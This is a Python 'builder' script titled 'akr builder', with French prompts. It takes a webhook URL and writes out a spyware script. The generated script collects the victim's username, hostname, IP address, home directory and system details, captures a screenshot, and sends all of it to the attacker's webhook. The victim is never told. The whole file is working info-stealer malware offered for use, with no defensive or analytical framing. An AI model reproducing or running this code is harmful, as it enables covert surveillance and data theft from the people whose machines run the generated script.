import textwrap
import pyfiglet


print(pyfiglet.figlet_format("akr builder"))

nomfichier = input("Choisie le nom du fichier : ")
webhook = input("Choisie le webhook : ")

texte = f"""
import requests
import socket
import os
import platform
import pyautogui
import requests
import io
from PIL import Image
import psutil
import platform
import os
import tkinter

webhook_url = "{webhook}" 

# Info pc
def grab_info():
    system_platform = platform.system()  
    path = os.path.expanduser('~')  
    login1 = os.getlogin()  
    hostname = socket.gethostname()  
    ip_address = socket.gethostbyname(hostname)  

    message = {{
        "content": f"# SIMPLE PC INFO\\n"
                   f"**Platform:** {{system_platform}}\\n"
                   f"**User Login:** {{login1}}\\n"
                   f"**Hostname:** {{hostname}}\\n"
                   f"**IP Address:** {{ip_address}}\\n"
                   f"**Home Directory:** {{path}}"
    }}
    response = requests.post(webhook_url, json=message)

# Info pc plus pousséakr
def get_system_info():
    uname_info = platform.uname()  
    message = {{
        "content": f"# PC INFO PLUS POUSSER\\n"
                   f"**Version du système:** {{uname_info.version}}\\n"
                   f"**Architecture:** {{uname_info.machine}}\\n"
                   f"**Processeur:** {{uname_info.processor}}"
    }}
    response = requests.post(webhook_url, json=message)


# screen
def screen_grab():
    screenshot = pyautogui.screenshot()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    files = {{
        'file': ('screenshot.png', img_byte_arr, 'image/png')
    }}

    response = requests.post(webhook_url, files=files)


grab_info()
get_system_info()
screen_grab()

"""

texte_sans_indentation = textwrap.dedent(texte)

with open(nomfichier, "w") as fichier:
    fichier.write(texte_sans_indentation)

print("Le fichier a été créé avec succès !")
